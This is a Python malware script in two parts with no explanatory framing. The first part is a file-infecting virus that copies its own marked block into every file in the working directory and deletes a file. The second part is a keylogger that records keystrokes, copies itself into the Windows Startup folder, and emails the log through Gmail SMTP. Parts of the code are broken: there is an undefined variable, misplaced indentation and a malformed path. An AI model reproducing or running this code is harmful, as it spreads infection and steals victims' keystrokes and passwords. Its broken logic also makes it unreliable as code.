##~ start_infection ~##

virus_platform=[]
with open(sys.argv[0], "r") as file:
    data=file.readlines()

virus_execution = False
for false_data in data:
    if false_data == "##~ start_infection ~##\n":
        virus_execution = True
    if virus_execution:
        virus_platform.append(false_data)
    if false_data == "##~ end_infection ~##\n":
        break

file_destruction = glob.glob("*.*")
for usr_files in file_destruction:
    with open(usr_files, "r") as file:
        script_code = file.readlines()

    infection0 = False
    for data in script_code:
        if data == "##~ start_infection ~##\n":
            infection0 = True
            break
    if not infection0:
        debug_virus = []
        debug_virus.extend(virus_platform)
        debug_virus.extend("\n")
        debug_virus.extend(script_code)
        with open(usr_files, "w") as file:
            file.writelines(debug_virus)

## coding malicipous code
def malicious_hacking():
    os.remove('/root/Desktop/TXT/hacker.txt')

thread = threading.Thread(target=malicious_hacking())
thread.start()
##~ end_infection ~##
import os
from pynput.keyboard import Listener
import logging
from shutil import copyfile
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from time import sleep

username = os.getlogin()
logger = "Keylogger"
#stokes = input("Infection:~/{}/key_stokes_path# ".format(logger))
logging_directory = f"/{username}/"+stokes777
logging.basicConfig(filename=f"{logging_directory}/infection_key.txt", level= logging.DEBUG, format= "%(asctime)s: %(message)s")

copyfile("infection_key.txt", f"C/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/file_name.py")

def key_handler(key):
    logging.info(key)
with Listener(on_press=key_handler) as listener:
    listener.join()
while True:
    def smtp(email_user, email_password, email_send):
    subject = 'INFECTION_STOKES!'

    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = subject

    body = 'Here is the KeyLogger_Results'
    msg.attach(MIMEText(body,'plain'))

    filename= 'infection_key.txt'
    attachment  =open(filename,'rb')

    part = MIMEBase('application','octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',"attachment; filename= "+filename)

    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email_user,email_password)
    server.sendmail(email_user,email_send,text)
    server.quit()
    sleep(interval)
